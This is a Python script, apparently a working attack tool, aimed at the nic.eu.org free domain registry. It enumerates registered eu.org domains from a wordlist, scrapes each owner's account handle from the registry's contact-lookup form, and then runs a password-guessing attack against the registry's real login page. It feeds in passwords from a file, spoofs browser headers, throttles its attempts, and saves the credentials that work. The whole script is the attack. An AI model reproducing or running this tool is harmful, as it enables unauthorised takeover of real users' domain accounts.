import time

import requests
import re
from concurrent.futures import ThreadPoolExecutor

from bs4 import BeautifulSoup


class Euorg:
    def __init__(self):
        self.http = requests.Session()
        self.have_session()

    def have_session(self):
        """初始化，获取 cookie 等等"""
        res = self.http.get('https://nic.eu.org/arf/en/contact/bydom', timeout=30)
        text = res.text
        self.csrf = re.search(r'<input type="hidden" name="csrfmiddlewaretoken" value="(\S+?)">', text).group(1)

    def scan(self, domain):
        """扫描单域名，已注册返回用户名，未注册返回 None"""
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://nic.eu.org/arf/en/contact/bydom'
        }

        data = {
            'domain': domain,
            'change': 'Find contacts for this domain',
            'csrfmiddlewaretoken': self.csrf
        }

        text = self.http.post('https://nic.eu.org/arf/en/contact/bydom', timeout=30, headers=headers, data=data).text

        re_user = re.search(r'My handle is (\S+?)-FREE', text)
        if re_user is None:
            return None
        else:
            return re_user.group(1)


def write_regist(path, text):
    with open(path, 'a', encoding='utf-8') as f:
        f.write(text + '\n')


def main():
    example = Euorg()
    pool = ThreadPoolExecutor(max_workers=8)

    # 读取字典
    f = open('./zidian.txt')
    domain = f.read().splitlines()
    f.close()
    domains = [i + '.eu.org' for i in domain]

    # 记录结果
    results = pool.map(example.scan, domains)
    # 代表数组下标
    flag = 0

    # 未注册
    noregist = []
    # 已注册
    regist = []
    # 总长度
    sumlength = len(domain)
    # 打印结果
    for i in results:
        print(f'{(flag + 1) / sumlength:.2%} : {flag + 1} / {sumlength} >>> {domains[flag]}\t', i)
        if i is None:
            noregist.append(domains[flag])
            write_regist('./noregist.txt', domains[flag])
        else:
            regist.append(domains[flag] + '\t' + i)
            write_regist('./regist.txt', domains[flag] + '\t' + i)

            mixUserInfo(domains[flag], i)
        flag = flag + 1


def mixUserInfo(domain, user):
    print(f'domain: {domain}, user: {user}')
    userName = user + '-FREE'
    with open('pwd.txt', 'r', encoding='utf-8') as file:
        lines = file.readlines()
        for line in lines:
            pwd = line.strip()
            login(userName, pwd)
            time.sleep(5)



# 登录
def login(user, pwd):
    print(f'login: {user}, {pwd}')
    # 创建会话维持cookie
    session = requests.Session()

    # 设置请求头(根据浏览器请求数据调整)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'Referer': 'https://nic.eu.org/arf/en/login/?next=/arf/en/',
        'Origin': 'https://nic.eu.org',
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
    }
    # 第一步：获取CSRF token
    login_url = "https://nic.eu.org/arf/en/login/?next=/arf/en/"
    response = session.get(login_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    # 获取用户输入
    username = user
    password = pwd

    # 构造POST数据
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'handle': username,
        'password': password,
        'next': '/arf/en/',
        'login': 'Login'
    }

    # 第二步：提交登录请求
    response = session.post(
        login_url,
        headers=headers,
        data=data,
        allow_redirects=True
    )

    # 检查登录结果
    if response.status_code == 200 and 'Two-Factor Authentication' in response.text:  # 根据实际成功页面调整判断条件
        print(f"登录成功！username: {username}, password: {password}")
        # 打印登录后的cookies
        print("Session Cookie:", session.cookies.get('sessionid'))
        write_regist('./login.txt', username + '\t' + password)
    else:
        print("登录失败，状态码:", response.status_code)


if __name__ == '__main__':
    print('>>> 开始运行~')
    # 计算时间
    start_time = time.time()
    main()
    now_time = time.time()
    print(f'\n>>> 运行结束，共耗时 {now_time - start_time:.2f} 秒。所得运行结果，在当前所在目录下，请查收。\n')
    input('>>> 按任意键退出……')
